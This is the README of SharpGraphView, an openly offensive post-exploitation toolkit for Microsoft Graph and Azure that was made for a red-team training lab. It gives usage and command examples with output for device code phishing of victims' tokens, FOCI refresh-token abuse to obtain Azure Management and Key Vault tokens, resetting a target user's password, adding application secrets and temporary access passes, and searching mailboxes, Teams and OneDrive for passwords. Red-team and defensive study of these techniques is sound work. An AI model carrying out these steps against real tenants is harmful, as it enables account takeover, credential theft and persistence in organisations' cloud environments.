# SharpGraphView

Sharp post-exploitation toolkit providing modular access to the Microsoft Graph API (*graph.microsoft.com*) for cloud and red team operations. 

Created during the new [Advanced Azure Cloud Attacks Lab](https://www.alteredsecurity.com/azureadvanced). Inspired by [GraphRunner](https://github.com/dafthack/GraphRunner) and [TokenTactics](https://github.com/rvrsh3ll/TokenTactics).


## Index

- [Updates](#Updates)
- [Build](#Build)
- [Usage](#Usage)
    - [Flags](#Flags)
    - [Methods](#Methods)
        - [Auth Methods](#Auth-methods)
        - [Post-Auth Methods](#post-auth-methods)
- [Demo](#Demo)
    - [Get-GraphTokens](#Get-GraphTokens)
    - [Invoke-RefreshToAzureManagementToken](#Invoke-RefreshToAzureManagementToken)
    - [Invoke-RefreshToMSGraphToken](#Invoke-RefreshToMSGraphToken)
- [Observations](#Observations)
    - [Common HTTP Error Codes](#Common-HTTP-Error-Codes)

<br>

# Updates

- 10/05/2024
```
Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
Add-ApplicationPassword                  - Add client secret to target application
Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user
```
- 14/05/2024
```
Get-TokenScope                           - Get scope for supplied token
```

<br>

# Build

Compiled executable in `bin/Release` is ready to go. 

If loading and building for the first time select the 'Restore' button in VS (may need to add and use [nuget.org](https://learn.microsoft.com/en-us/nuget/consume-packages/install-use-packages-visual-studio#package-sources) as a package source then update any packages via `References` > `Manage NuGet Packages...` > `Updates`)

![nuget-restore](https://github.com/mlcsec/SharpGraphView/assets/47215311/303148b7-bad8-4243-9deb-f8fe2cd44496)


The following packages are required:

- Newtonsoft.Json
- Costura.Fody

<br>

# Usage

> All methods and flags are case-insensitve. Method must be the first argument, flags are position-independent.

```
SharpGraphView by @mlcsec

Usage:

    SharpGraphView.exe [Method] [-Domain <domain>] [-Tenant <tenant id>] [-Id <object id>] [-Select <display property>] [-Query <api endpoint>] [-Search <string> -Entity <entity>] [-Token <access token>] [-Cert <pfx cert>]

Flags:

    -Token                                   - Microsoft Graph access token or refresh token for FOCI abuse
    -Cert                                    - X509Certificate path
    -Domain                                  - Target domain
    -Tenant                                  - Target tenant ID
    -Id                                      - ID of target object
    -Select                                  - Filter output for comma seperated properties
    -Query                                   - Raw API query (GET request only)
    -Search                                  - Search string
    -Entity                                  - Search entity [driveItem (OneDrive), message (Mail), chatMessage (Teams), site (SharePoint), event (Calenders)]
    -help                                    - Show help

Auth:

    Get-GraphTokens                          - Obtain graph token via device code phish (saved to graph_tokens.txt)
    Get-TenantID                             - Get tenant ID for target domain
    Get-TokenScope                           - Get scope of supplied token
    Invoke-RefreshToMSGraphToken             - Convert refresh token to Micrsoft Graph token (saved to new_graph_tokens.txt)
    Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
    Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token

Post-Auth:

    Get-CurrentUser                          - Get current user profile
    Get-CurrentUserActivity                  - Get recent actvity and actions of current user

    Get-OrgInfo                              - Get information relating to the target organisation
    Get-Domains                              - Get domain objects
    Get-User                                 - Get all users (default) or target user (-id)
    Get-UserProperties                       - Get current user properties (default) or target user (-id)
    Get-UserGroupMembership                  - Get group memberships for current user (default) or target user (-id)
    Get-UserTransitiveGroupMembership        - Get transitive group memberships for current user (default) or target user (-id)
    Get-Group                                - Get all groups (default) or target group (-id)
    Get-GroupMember                          - Get all members of target group
    Get-AppRoleAssignments                   - Get application role assignments for current user (default) or target user (-id)
    Get-ConditionalAccessPolicy              - Get conditional access policy properties
    Get-PersonalContacts                     - Get contacts of the current user
    Get-CrossTenantAccessPolicy              - Get cross tentant access policy properties
    Get-PartnerCrossTenantAccessPolicy       - Get partner cross tenant access policy
    Get-UserChatMessages                     - Get all messages from all chats for target user
    Get-AdministrativeUnitMember             - Get members of administrative unit
    Get-OneDriveFiles                        - Get all accessible OneDrive files for current user (default) or target user (-id)
    Get-UserPermissionGrants                 - Get permissions grants of current user (default) or target user (-id)
    Get-oauth2PermissionGrants               - Get oauth2 permission grants for current user (default) or target user (-id)
    Get-Messages                             - Get all messages in signed-in user's mailbox (default) or target user (-id)
    Get-TemporaryAccessPassword              - Get TAP details for current user (default) or target user (-id)
    Get-Password                             - Get passwords registered to current user (default) or target user (-id)

    List-AuthMethods                         - List authentication methods for current user (default) or target user (-id)
    List-DirectoryRoles                      - List all directory roles activated in the tenant
    List-Notebooks                           - List current user notebooks (default) or target user (-id)
    List-ConditionalAccessPolicies           - List conditional access policy objects
    List-ConditionalAuthenticationContexts   - List conditional access authentication context
    List-ConditionalNamedLocations           - List conditional access named locations
    List-SharePointRoot                      - List root SharePoint site properties
    List-SharePointSites                     - List any available SharePoint sites
    List-ExternalConnections                 - List external connections
    List-Applications                        - List all Azure Applications
    List-ServicePrincipals                   - List all service principals
    List-Tenants                             - List tenants
    List-JoinedTeams                         - List joined teams for current user (default) or target user (-id)
    List-Chats                               - List chats for current user (default) or target user (-id)
    List-Devices                             - List devices
    List-AdministrativeUnits                 - List administrative units
    List-OneDrives                           - List current user OneDrive (default) or target user (-id)
    List-RecentOneDriveFiles                 - List current user recent OneDrive files
    List-SharedOneDriveFiles                 - List OneDrive files shared with the current user

    Invoke-Search                            - Search for string within entity type (driveItem, message, chatMessage, site, event)
    Find-PrivilegedRoleUsers                 - Find users with privileged roles assigned
    Invoke-CustomQuery                       - Custom GET query to target Graph API endpoint
    Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
    Add-ApplicationPassword                  - Add client secret to target application
    Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user

Examples:

    SharpGraphView.exe Get-GraphTokens
    SharpGraphView.exe Invoke-RefreshToAzureManagementToken -tenant <tenant id> -token <refresh token>
    SharpGraphView.exe Get-User -id john.doe@vulncorp.onmicrosoft.com -token .\token.txt -select displayname,id
    SharpGraphView.exe Get-UserGroupMembership -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe List-RecentOneDriveFiles -token .\token.txt
    SharpGraphView.exe Invoke-Search -search "password" -entity driveItem -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe Invoke-CustomQuery -Query "https://graph.microsoft.com/v1.0/sites/{siteId}/drives" -token .\token.txt
```
<br>

## Flags

#### -Token

Microsoft Graph access token (**REQUIRED** for all methods except `Get-GraphTokens`) or refresh token for FOCI abuse (`Invoke-Refresh*` methods)

```powershell
PS > .\SharpGraphView.exe Get-Group -token .\token.txt
PS > .\SharpGraphView.exe Get-Group -token eyJ0eXAiOiJKV1QiLCJ...

```
<br>

#### -Cert

Path to Azure Application X509Certificate (**REQUIRED** for `Invoke-CertToAccessToken`):

```powershell
.\SharpGraphView.exe invoke-certtoaccesstoken -tenant <tenant id> -cert .\cert.pfx -id <app id>
```

<br>

#### -Domain

Target domain name (**REQUIRED** for `Get-TenantID`)

```powershell
PS > .\SharpGraphView.exe Get-TenantID -domain targetcorp.domain
```
<br>

#### -Tenant
  
Target Tenant ID (**REQUIRED** for `Invoke-Refresh*` methods)

```powershell
PS > .\SharpGraphView.exe Invoke-RefreshToAzureManagementToken -token refreshtoken.txt -tenant fbf34b9d-6375-4137-ae1f-8cb12df29bb5
```
<br>

#### -ID

ID of target object
- can be the user ID or User Principal Name for user related methods
- use the object ID for all others (groups, admin units, etc.)
```powershell
PS > .\SharpGraphView.exe Get-user -id 5a48ab0f-c546-441f-832a-8ab48348e372 -token .\token.txt
PS > .\SharpGraphView.exe Get-User -id JohnDoe@TargetCorp1.onmicrosoft.com -token .\token.txt
```
<br>

#### -Select

Filter output and only display the supplied comma separated properties:
```powershell
PS > .\SharpGraphView.exe get-group -token .\token.txt -select displayname,description

[*] Get-Group
value: [
  {
    "displayName": "DevOps",
    "description": "Members of this group will have access to DevOps resources"
  },
...
```
<br>

#### -Query

Raw API query (GET request endpoints only currently)
- useful for enumerating drive items and other resources with variable endpoints:
  
```
GET /drives/{drive-id}/items/{item-id}/children
GET /groups/{group-id}/drive/items/{item-id}/children
GET /me/drive/items/{item-id}/children
GET /sites/{site-id}/drive/items/{item-id}/children
GET /users/{user-id}/drive/items/{item-id}/children
```
Example below returning select user details from `/me` endpoint:
```powershell
PS > .\SharpGraphView.exe invoke-customquery -query https://graph.microsoft.com/v1.0/me -token .\token.txt -select displayname,userprincipalname

[*] Invoke-CustomQuery
displayName: John Doe
userPrincipalName: JohnDoe@TargetCorp1.onmicrosoft.com
```
<br>

#### -Search & -Entity

Search string, e.g. "password"
  - need to add `queryTemplate` option to filter by properties (e.g. `{searchTerms} CreatedBy:` etc.) using [KQL](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/keyword-query-language-kql-syntax-reference)

Target resource (entity) to search e.g. driveItem (OneDrive), message (Mail), chatMessage (Teams), site (SharePoint), event (Calenders)
  - more details can be found within the [Microsoft Graph API docs](https://learn.microsoft.com/en-us/graph/api/resources/searchrequest?view=graph-rest-1.0)
```powershell
PS > .\SharpGraphView.exe invoke-search -search "credentials" -entity driveItem -token .\token.txt
PS > .\SharpGraphView.exe invoke-search -search "password" -entity message -token .\token.txt
```

<br>
<br>

## Methods

### Auth Methods:

| Command                                  | Description                                    |
|------------------------------------------|------------------------------------------------|
| **Get-GraphTokens**                          | Get graph token via device code phish (saved to _graph_tokens.txt_) | 
| **Get-TenantID** -Domain \<domain\>                            | Get tenant ID for target domain  | 
| **Get-TokenScope** -Token \<token\>                   | Get scope for the supplied token|
| **Invoke-RefreshToMSGraphToken** -Token \<refresh\> -Tenant \<id\>            | Convert refresh token to Microsoft Graph token (saved to _new_graph_tokens.txt_)  |  
| **Invoke-RefreshToAzureManagementToken** -Token \<refresh\> -Tenant \<id\>    | Convert refresh token to Azure Management token (saved to _az_tokens.txt_)|
|**Invoke-RefreshToVaultToken** -Token \<refresh\> | Convert refresh token to Azure Vault token (saved to _vault_tokens.txt_)|
|**Invoke-CertToAccessToken** -Cert \<path to pfx\> -ID \<app id\> -Tenant \<id\>| Convert Azure Application certificate to JWT access token|

### Post-Auth Methods:

> All methods are subject to the assigned roles and permissions for the current access account

- The `-token` flag is **REQUIRED** for all post-authentication methods.
- Flags in square brackets/italics below are optional arguments. Flags without are **REQUIRED**.


| Method                                  | Description                                                     |
|------------------------------------------|-----------------------------------------------------------------|
| **Get-CurrentUser**                          | Get current user profile                                         |
| **Get-CurrentUserActivity**                  | Get recent activity and actions of current user                         |
| **Get-OrgInfo**                              | Get information relating to the target organization                                               |
| **Get-Domains**                              | Get domain objects                                               |
| **Get-User** _[-ID <userid/upn>]_                 | Get all users (default) or target user (-id)  |
| **Get-UserProperties** _[-ID <userid/upn>]_                       | Get current user properties (default) or target user (-id) !WARNING! loud/slow due to 403 errors when grouping properties        |
| **Get-UserGroupMembership** _[-ID <userid/upn>]_                 | Get group memberships for current user (default) or target user (-id)  |
| **Get-UserTransitiveGroupMembership** _[-ID <userid/upn>]_       | Get transitive group memberships for current user (default) or target user (-id)                |
| **Get-Group** _[-ID \<groupid\>]_                               | Get all groups (default) or target group (-id)                              |
| **Get-GroupMember** -ID \<groupid\>                         | Get all members of target group                              |
| **Get-AppRoleAssignments** _[-ID <userid/upn>]_                   | Get application role assignments for current user (default) or target user (-id)                                           |
| **Get-ConditionalAccessPolicy** -ID \<cap id\>             | Get conditional access policy properties                            |
| **Get-PersonalContacts**                     | Get contacts of the current user                                               |
| **Get-CrossTenantAccessPolicy**              | Get cross tenant access policy properties                                               |
| **Get-PartnerCrossTenantAccessPolicy**       | Get partner cross tenant access policy                                              |
| **Get-UserChatMessages** -ID \<userid/upn\>                    | Get all messages from all chats for target user     |
| **Get-AdministrativeUnitMember** -ID \<admin unit id\>             | Get members of administrative unit                      |
| **Get-OneDriveFiles** _[-ID \<userid/upn\>]_                      | Get all accessible OneDrive files for current user (default) or target user (-id)                                             |
| **Get-UserPermissionGrants** _[-ID \<userid/upn\>]_                | Get permissions grants of current user (default) or target user (-id)                          |
| **Get-oauth2PermissionGrants** _[-ID \<userid/upn\>]_              | Get oauth2 permission grants for current user (default) or target user (-id)                                               |
| **Get-Messages** _[-ID \<userid/upn\>]_                            | Get all messages in signed-in user's mailbox (default) or target user (-id)                                               |
| **Get-TemporaryAccessPassword** _[-ID \<userid/upn\>]_             | Get TAP details for current user (default) or target user (-id)                   |
| **Get-Password** _[-ID \<userid/upn\>]_                            | Get passwords registered to current user (default) or target user (-id)                    |
| **List-AuthMethods** _[-ID \<userid/upn\>]_                        | List authentication methods for current user (default) or target user (-id)                                           |
| **List-DirectoryRoles**                      | List all directory roles activated in the tenant                                            |
| **List-Notebooks** _[-ID \<userid/upn\>]_                          | List current user notebooks (default) or target user (-id)                                               |
| **List-ConditionalAccessPolicies**           | List conditional access policy objects                                              |
| **List-ConditionalAuthenticationContexts**   | List conditional access authentication context                                             |
| **List-ConditionalNamedLocations**           | List conditional access named locations                                               |
| **List-SharePointRoot**                      | List root SharePoint site properties                                              |
| **List-SharePointSites**                     | List any available SharePoint sites                                           |
| **List-ExternalConnections**                 | List external connections                                               |
| **List-Applications**                        | List all Azure Applications                                              |
| **List-ServicePrincipals**                   | List all service principals                                               |
| **List-Tenants**                             | List tenants                                               |
| **List-JoinedTeams** _[-ID \<userid/upn\>]_                        | List joined teams for current user (default) or target user (-id)|
| **List-Chats** _[-ID \<userid/upn\>]_                              | List chats for current user (default) or target user (-id)  |
| **List-Devices**                             | List devices                                                |
| **List-AdministrativeUnits**                 | List administrative units                                               |
| **List-OneDrives** _[-ID \<userid/upn\>]_                          | List current user OneDrive (default) or target user (-id)                            |
| **List-RecentOneDriveFiles**                 | List current users recent OneDrive files                                               |
| **List-SharedOneDriveFiles**                 | List OneDrive files shared with the current user                                               |
| **Invoke-Search** -Search \<string\> -Entity \<entity\>                           | Search for string within entity type (driveItem, message, chatMessage, site, event)          |
| **Find-PrivilegedRoleUsers**                 | Find users with privileged roles assigned                                               |
| **Invoke-CustomQuery** -Query \<graph endpoint URL\>                      | Custom GET query to target Graph API endpoint e.g. `https://graph.microsoft.com/v1.0/me`                                           |
| **Update-UserPassword** -ID \<userid/upn\> | Update the passwordProfile of the target user (NewUserS3cret@Pass!) |
|**Add-ApplicationPassword** -ID \<appid\> |Add client secret to target application|
|**Add-UserTAP** -ID \<userid/upn\> |Add new Temporary Access Password (TAP) to target user|


### Coming soon:

> More commands and options to be added

| Method                                  | Description                                                     |Endpoints                                        |
|------------------------------------------|-----------------------------------------------------------------|-----------------------------------------------|
| Add-GroupMember                          | Add user to target group                                              | `POST /groups/{group-id}/members/$ref`        |
| Create-User                              | Create new malicious user                                                | `POST /users`          |
| Download-DriveItem                       | Download content of DriveItem                                             | A lot of options, Invoke-CustomQuery can be used for now <br> `GET /drives/{drive-id}/items/{item-id}/content` <br> `GET /groups/{group-id}/drive/items/{item-id}/content` <br> ... |

Addtional `Invoke-RefreshTo...` methods can and will be ported from [TokenHandler.ps1](https://github.com/rvrsh3ll/TokenTactics/blob/main/modules/TokenHandler.ps1).

<br>
<br>

# Demo

## Get-GraphTokens

Generates a sign-in message along with a unique code to be sent to the victim (device code phishing). Monitors for authentication, with a timeout set to 15 minutes. Upon successful authentication, a valid token is returned:

![getgraphtokens-edit-crop](https://github.com/mlcsec/SharpGraphView/assets/47215311/65de3da1-f40a-46c2-959c-f99885fd80cc)


The Microsoft Graph API access token can then be copied to a local file or directly parsed to the `-token` parameter:

```powershell
PS > .\SharpGraphView.exe get-usergroupmembership -token .\token.txt

[*] Get-UserGroupMembership
value: [
  {
    "@odata.type": "#microsoft.graph.directoryRole",
    "id": "5a48ab0f-c546-441f-832a-8ab48348e372",
    "deletedDateTime": null,
    "description": "Can read everything that a Global Administrator can, but not update anything.",
    "displayName": "Global Reader",
    "roleTemplateId": "f2ef992c-3afb-46b9-b7cf-a126ee74c451"
  }
]
```

## Invoke-RefreshToAzureManagementToken

FOCI can be abused to obtain a valid Azure Management token using the refresh token obtained from `Get-GraphTokens`. Use `Get-TenantID -domain <target.domain>` to get the tenant ID of the target domain. 

![invokemsgraphrefresh-edit-crop](https://github.com/mlcsec/SharpGraphView/assets/47215311/46ca692d-d48c-4262-9f47-6ae0b6f004f0)


The Azure Management token can then be used with `Connect-AzAccount` to access Azure resources via the Azure Management (Az) PowerShell module:
```powershell
PS > $aztoken = "eyJ0eXAiOiJKV1QiLCJ..."

PS > Connect-AzAccount -AccessToken $aztoken -AccountId JohnDoe@TargetCorp1.onmicrosoft.com

Account                                      SubscriptionName       TenantId                             Environment
-------                                      ----------------       --------                             -----------
JohnDoe@TargetCorp1.onmicrosoft.com          TargetCorp1            fbf34b9d-6375-4137-ae1f-8cb12df29bb5 AzureCloud
```

## Invoke-RefreshToMSGraphToken

FOCI can be abused again to obtain a new Microsoft Graph token if the original token has expired:

```powershell
PS > .\SharpGraphView.exe Invoke-RefreshTokenToMSGraphToken -token .\refreshtoken.txt -tenant <tenant id>
```

## Invoke-RefreshToVaultToken

An Azure Vault token can be obtained in a similar fashion:

```powershell
PS > .\SharpGraphView.exe invoke-refreshtovaulttoken -token <refresh>

[*] Invoke-RefreshToVaultToken

[+] Token Obtained!
[*] token_type: Bearer
[*] scope: https://vault.azure.net/user_impersonation https://vault.azure.net/.default
[*] expires_in: 5164
[*] ext_expires_in: 5164
[*] access_token: eyJ0eXAiOiJKV1QiL...
[*] refresh_token: 0.AUoAQlq91mV...
[*] foci: 1
[*] id_token: eyJ0eXAiOiJKV1Q...

[+] Token information written to 'vault_tokens.txt'.

# connect with new Vault token
PS > Connect-AzAccount -AccessToken <ARM access token> -KeyVaultAccessToken <vault access token> -AccountId <user account>
```

## Invoke-CertToAccessToken

Obtain an access token from a valid Azure Application certificate then authenticate as the service principal:

```powershell
PS > .\SharpGraphView.exe Invoke-CertToAccessToken -tenant <tenant id> -cert .\cert.pfx -id <app id>

[*] Invoke-CertToAccessToken

[+] Token Obtained!
[*] token_type: Bearer
[*] expires_in: 3599
[*] ext_expires_in: 3599
[*] access_token: eyJ0eXAiOiJKV1QiLCJub2...

[+] Token information written to 'cert_tokens.txt'.
```

The access token can then be used as normal with the `-Token` flag.

## Get-TokenScope

Display the scope of the access token:

```powershell
PS > .\SharpGraphView.exe get-tokenscope -token eyJ0eXAiOiJKV...

[*] Get-TokenScope
AuditLog.Read.All
Calendar.ReadWrite
Calendars.Read.Shared
Calendars.ReadWrite
Contacts.ReadWrite
DataLossPreventionPolicy.Evaluate
Directory.AccessAsUser.All
Directory.Read.All
Files.Read
Files.Read.All
Files.ReadWrite.All
Group.Read.All
Group.ReadWrite.All
InformationProtectionPolicy.Read
Mail.ReadWrite
Mail.Send
Notes.Create
Organization.Read.All
People.Read
People.Read.All
Printer.Read.All
PrintJob.ReadWriteBasic
SensitiveInfoType.Detect
SensitiveInfoType.Read.All
SensitivityLabel.Evaluate
Tasks.ReadWrite
TeamMember.ReadWrite.All
TeamsTab.ReadWriteForChat
User.Read.All
User.ReadBasic.All
User.ReadWrite
Users.Read
```

<br>

# Observations

## Common HTTP Error Codes

Several HTTP error codes may be encountered when running certain methods:

- `400` - Bad request, can occur when authenticated as a service principal and attempt to use methods which target `/me/<...>` endpoints
- `401` - Unauthorised, commonly occurs when an access token expires, isn't formatted correctly, or hasn't been supplied
- `403` - Access to the resource/endpoint is forbidden, likely due to insufficient perms or some form of conditional access
- `429` - User has sent too many requests in a given amount of time and triggered tate limiting, hold off for a few minutes

<br>

# Todo

## Addtional Authentication Methods

Currently, only access token authentication is supported. The following authentication processes will be ported:

```powershell
# client secret auth:
$password = ConvertTo-SecureString 'app secret...' -AsPlainText -Force
creds = New-Object System.Management.Automation.PSCredential('app id', $password)
Connect-MgGraph -ClientSecretCredential $creds -TenantId <>
```

Additional auth methods from [Connect-MgGraph](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.authentication/connect-mggraph?view=graph-powershell-1.0) can be ported as necessary.

## Test

- inlineExecute-Assembly 
- bofnet_executeassembly 


